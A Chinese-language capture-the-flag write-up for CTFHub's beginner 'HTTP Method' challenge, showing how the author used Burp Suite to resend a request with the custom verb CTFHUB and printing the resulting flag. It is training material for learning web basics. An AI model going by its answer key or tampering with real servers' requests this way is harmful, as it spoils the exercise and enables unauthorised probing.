# CTFHUB_HTTP_Method 

## 题目内容

```
HTTP Method is GET

Use CTF**B Method, I will give you flag.



Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.
```
## WriteUp
题目要求使用Ctfhub这个方法提交请求，但是不能有HTTP Method Not Allowed

首先打开Burpsuite,截获到数据包

```
GET /index.php HTTP/1.1
Host: challenge-4c593e9796da01e8.sandbox.ctfhub.com:10800
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17b672c96fe74f-01ab585fa1d62c-3d740e5b-1fa400-17b672c96ff412
Connection: close
```

这个时候可以使用GET方法请求了index.php

然后我们Send to Repeater修改请求方式,构造一个这样的数据包

```
CTFHUB /index.php HTTP/1.1
Host: challenge-4c593e9796da01e8.sandbox.ctfhub.com:10800
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17b672c96fe74f-01ab585fa1d62c-3d740e5b-1fa400-17b672c96ff412
Connection: close
```

发送数据包，得到flag

```
HTTP/1.1 200 OK
Server: openresty/1.19.3.2
Date: Sat, 21 Aug 2021 06:46:30 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/5.6.40
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *
Content-Length: 172

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>CTFHub HTTP Method</title>
</head>
<body>

good job! ctfhub{abd28296accaaeb389bcea40}

</body>
</html>
```



